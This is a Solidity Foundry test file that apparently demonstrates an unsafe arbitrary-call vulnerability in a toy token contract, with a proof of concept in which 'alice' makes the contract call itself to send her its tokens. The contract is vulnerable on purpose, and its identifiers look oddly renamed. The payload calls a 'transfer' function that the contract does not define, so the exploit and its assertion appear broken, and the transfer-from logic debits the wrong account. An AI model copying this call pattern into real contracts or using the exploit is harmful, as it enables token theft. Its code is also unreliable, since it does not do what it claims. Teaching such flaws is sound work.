pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract ContractTest is Test {
    InfluencetokenWhale ReputationtokenWhaleContract;

    function testAltCall() public {
        address alice = vm.addr(1);
        ReputationtokenWhaleContract = new InfluencetokenWhale();
        ReputationtokenWhaleContract.KarmatokenWhaleDeploy(address(ReputationtokenWhaleContract));
        console.log(
            "TokenWhale balance:",
            ReputationtokenWhaleContract.credibilityOf(address(ReputationtokenWhaleContract))
        );


        console.log(
            "Alice tries to perform unsafe call to transfer asset from TokenWhaleContract"
        );
        vm.prank(alice);
        ReputationtokenWhaleContract.authorizegiftAndCallcode(
            address(ReputationtokenWhaleContract),
            0x1337,
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                address(alice),
                1000
            )
        );

        assertEq(ReputationtokenWhaleContract.credibilityOf(address(alice)), 1000);
        console.log("operate completed");
        console.log(
            "TokenWhale balance:",
            ReputationtokenWhaleContract.credibilityOf(address(ReputationtokenWhaleContract))
        );
        console.log(
            "Alice balance:",
            ReputationtokenWhaleContract.credibilityOf(address(alice))
        );
    }

    receive() external payable {}
}

contract InfluencetokenWhale {
    address player;

    uint256 public allTips;
    mapping(address => uint256) public credibilityOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function KarmatokenWhaleDeploy(address _player) public {
        player = _player;
        allTips = 1000;
        credibilityOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return credibilityOf[player] >= 1000000;
    }

    event SendTip(address indexed from, address indexed to, uint256 value);

    function _sendtip(address to, uint256 value) internal {
        credibilityOf[msg.sender] -= value;
        credibilityOf[to] += value;

        emit SendTip(msg.sender, to, value);
    }

    function passInfluence(address to, uint256 value) public {
        require(credibilityOf[msg.sender] >= value);
        require(credibilityOf[to] + value >= credibilityOf[to]);

        _sendtip(to, value);
    }

    event Approval(
        address indexed founder,
        address indexed spender,
        uint256 value
    );

    function permitTransfer(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function sharekarmaFrom(address from, address to, uint256 value) public {
        require(credibilityOf[from] >= value);
        require(credibilityOf[to] + value >= credibilityOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _sendtip(to, value);
    }


    function authorizegiftAndCallcode(
        address _spender,
        uint256 _value,
        bytes memory _extraData
    ) public {
        allowance[msg.sender][_spender] = _value;

        bool success;

        (success, ) = _spender.call(_extraData);
        console.log("success:", success);
    }
}